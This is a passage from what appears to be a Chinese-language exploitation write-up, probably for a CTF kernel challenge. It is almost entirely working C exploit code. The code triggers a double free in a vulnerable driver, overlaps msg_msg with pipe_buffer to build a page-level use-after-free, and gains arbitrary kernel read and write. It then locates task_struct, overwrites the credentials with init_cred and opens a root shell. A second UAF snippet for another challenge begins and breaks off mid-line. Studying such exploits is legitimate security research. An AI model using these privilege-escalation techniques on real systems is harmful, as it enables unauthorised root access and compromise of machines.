now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-comment">/* userspace status saver */</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* bind the process to specific core */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>;</span><br><br><span class="hljs-comment">/* read start from len to offset, write start from offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>    <span class="hljs-type">int</span> (*confirm)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">int</span> (*try_steal)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">int</span> (*get)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY 040000</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">struct msgbuf &#123;</span><br><span class="hljs-comment">    long mtype;</span><br><span class="hljs-comment">    char mtext[0];</span><br><span class="hljs-comment">&#125;;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_msg_queue</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * the msgp should be a pointer to the `struct msgbuf`,</span><br><span class="hljs-comment"> * and the data should be stored in msgbuf.mtext</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY        040000  <span class="hljs-comment">/* copy (not remove) all queue messages */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">peek_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build_msg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * II - interface to interact with /dev/kcache</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-comment">/* msg type */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REQUEST    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REPLY      2</span><br><br><span class="hljs-comment">/* user to kernel request */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_ENCRYPT_TEA     1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DECRYPT_TEA     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_HASH_MD5        3</span><br><br><span class="hljs-comment">/* msg status */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS      1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_FAIL         2</span><br><br><span class="hljs-comment">/* for ioctl */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RECV_MSG 0x114514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEND_MSG 0x1919810</span><br><br><span class="hljs-comment">/* message header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> type;<br>    <span class="hljs-type">uint16_t</span> cmd;<br>    <span class="hljs-type">uint16_t</span> status;    <span class="hljs-comment">/* for TYPE_REPLY only */</span><br>    <span class="hljs-type">size_t</span>  tag;        <span class="hljs-comment">/* for user to identify different message */</span><br>    <span class="hljs-type">size_t</span> data_len;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tea_crypt_info</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">char</span> text[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_msg_hdr(_hdr, _type, _cmd, _status, _tag, _data_len)        \</span><br><span class="hljs-meta">    do &#123;                                                        \</span><br><span class="hljs-meta">        _hdr-&gt;type = _type;                                     \</span><br><span class="hljs-meta">        _hdr-&gt;cmd = _cmd;                                       \</span><br><span class="hljs-meta">        _hdr-&gt;status = _status;                                 \</span><br><span class="hljs-meta">        _hdr-&gt;tag = _tag;                                       \</span><br><span class="hljs-meta">        _hdr-&gt;data_len = _data_len;                             \</span><br><span class="hljs-meta">    &#125; while (0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_hdr_data(__hdr, ptr_type) (&#123;                        \</span><br><span class="hljs-meta">    ((ptr_type*) &amp;__hdr-&gt;data);                                 \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">kkk_send_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> msg_hdr *msg)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, SEND_MSG, msg);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">kkk_recv_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> msg_hdr *msg)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, RECV_MSG, msg);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  III - FIRST exploit stage - make page-level UAF</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECOND_LEVEL_PIPE_NUM 0x100</span><br><br><span class="hljs-type">int</span> rw_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> second_level_pipe[SECOND_LEVEL_PIPE_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> msqid;<br><span class="hljs-type">size_t</span> msg_buf[<span class="hljs-number">0x1000</span>], *pipe_buf, pipe_ops;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_uaf_on_msg_and_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> *<span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">size_t</span> checksum;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">char</span> *buf;<br><br>    msqid = get_msg_queue();<br><br>    msg = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>    <span class="hljs-built_in">memset</span>(msg, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(*msg));<br>    set_msg_hdr(msg, TYPE_REQUEST, CMD_ENCRYPT_TEA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(*msg));<br><br>    <span class="hljs-comment">/* prepare the pipes in advance */</span><br>    pipe(rw_pipe);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * trigger double free to make pipe_buffer and msg_seg the same object.</span><br><span class="hljs-comment">     * note that we should write and read the pipe in advance, so that it won&#x27;t</span><br><span class="hljs-comment">     * use the pipe_buffer[0], which will lead to an invalid msg_seg</span><br><span class="hljs-comment">     */</span><br>    kkk_send_msg(dev_fd, msg);<br>    sleep(<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> (kkk_recv_msg(dev_fd, (<span class="hljs-keyword">struct</span> msg_hdr *) <span class="hljs-number">0xbeefedead0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[=] errno: %d\n&quot;</span>, errno);<br>    &#125;<br>    fcntl(rw_pipe[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>);<br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    read(rw_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">if</span> (kkk_recv_msg(dev_fd, (<span class="hljs-keyword">struct</span> msg_hdr *) <span class="hljs-number">0xdeadbeef0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[=] errno: %d\n&quot;</span>, errno);<br>    &#125;<br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    peek_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    pipe_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) msg_buf + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg));<br>    <span class="hljs-keyword">if</span> (pipe_buf[<span class="hljs-number">12</span>] &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to make UAF on pipe!&quot;</span>);<br>    &#125;<br>    pipe_ops = pipe_buf[<span class="hljs-number">12</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully build UAF pipe_buffer!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Page: \033[0m%lx &quot;</span>, pipe_buf[<span class="hljs-number">10</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m, ops: \033[0m%lx\n&quot;</span>, pipe_ops);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">fake_buf</span>;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-type">size_t</span> page_addr, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    fake_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;pipe_buf[<span class="hljs-number">5</span>];<br>    read_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    fake_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_buf-&gt;len = <span class="hljs-number">0x1ff8</span>;<br>    fake_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) pipe_ops;<br><br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    read(rw_pipe[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0xfff</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-type">size_t</span> page_addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    fake_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;pipe_buf[<span class="hljs-number">10</span>];<br>    read_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    fake_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_buf-&gt;len = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) pipe_ops;<br><br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    len = len &gt; <span class="hljs-number">0xffe</span> ? <span class="hljs-number">0xffe</span> : len;<br><br>    write(rw_pipe[<span class="hljs-number">1</span>], buf, len);<br>&#125;<br><br><span class="hljs-type">size_t</span> data_buf[<span class="hljs-number">0x1000</span>], *tsk_buf, current_task_page, current_task, parent_task;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">seek_current_task_struct</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span>  *comm_addr;<br><br>    vmemmap_base = pipe_buf[<span class="hljs-number">10</span>] &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe(vmemmap_base + i * <span class="hljs-number">0x40</span>, data_buf);<br>    <br>        comm_addr = memmem(data_buf, <span class="hljs-number">0xf00</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-61</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-60</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br><br>            <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-61</span>];<br><br>            <span class="hljs-comment">/* task_struct::ptraced */</span><br>            current_task = comm_addr[<span class="hljs-number">-54</span>] - <span class="hljs-number">2528</span>;<br><br>            page_offset_base = (comm_addr[<span class="hljs-number">-54</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%lx\n&quot;</span>,<br>                   (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>                   page_offset_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* finding the init_task, the final parent of every task */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking for init_task...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);<br><br>        tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) data_buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br><br>        arbitrary_read_by_pipe(ptask_page_addr, data_buf);<br>        arbitrary_read_by_pipe(ptask_page_addr+<span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>]);<br><br>        <span class="hljs-comment">/* task_struct::real_parent */</span><br>        <span class="hljs-keyword">if</span> (parent_task == tsk_buf[<span class="hljs-number">309</span>]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        parent_task = tsk_buf[<span class="hljs-number">309</span>];<br>    &#125;<br><br>    init_task = parent_task;<br>    init_cred = tsk_buf[<span class="hljs-number">367</span>];<br>    init_nsproxy = tsk_buf[<span class="hljs-number">381</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe(current_task_page, data_buf);<br>    arbitrary_read_by_pipe(current_task_page + <span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) data_buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">367</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">368</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">381</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe(current_task_page, data_buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe(current_task_page + <span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kkk&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open /dev/kkk!&quot;</span>);<br>    &#125;<br><br>    construct_uaf_on_msg_and_pipe();<br>    seek_current_task_struct();<br>    privilege_escalation_by_task_overwrite();<br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行即可完成提权：</p><p><img src="https://s2.loli.net/2023/07/13/sr65qaWAN9lE4Cy.png" alt="image.png"></p><blockquote><p><del>笔者也不记得该编译选项是否默认开启了</del>，若未开启该编译选项，则仍可以直接构造 page-level UAF，以笔者去年出的题目 <code>d3kheap</code> 为例，可以通过如下方式完成 page UAF 的构造，细节参见注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECOND_LEVEL_PIPE_NUM 0x100</span><br><br><span class="hljs-type">int</span> victim_pipe[<span class="hljs-number">2</span>], vuln_pipe[<span class="hljs-number">2</span>], holder_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> second_level_pipe[SECOND_LEVEL_PIPE_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">size_t</span> pipe_buf[<span class="hljs-number">0x1000</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_page_uaf_with_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> checksum;<br><br>    <span class="hljs-built_in">memset</span>(pipe_buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(pipe_buf));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        pipe(second_level_pipe[i]);<br>    &#125;<br><br>    <span class="hljs-comment">/* make two pipes point to the same buffer */</span><br>    add();<br>    del();<br>    pipe(victim_pipe);<br>    <br>    del();<br>    pipe(vuln_pipe);<br><br>    <span class="hljs-comment">/* init pipe-&gt;head and pipe-&gt;tail, allocate page on buffer */</span><br>    write(victim_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rat3bant&quot;</span>, <span 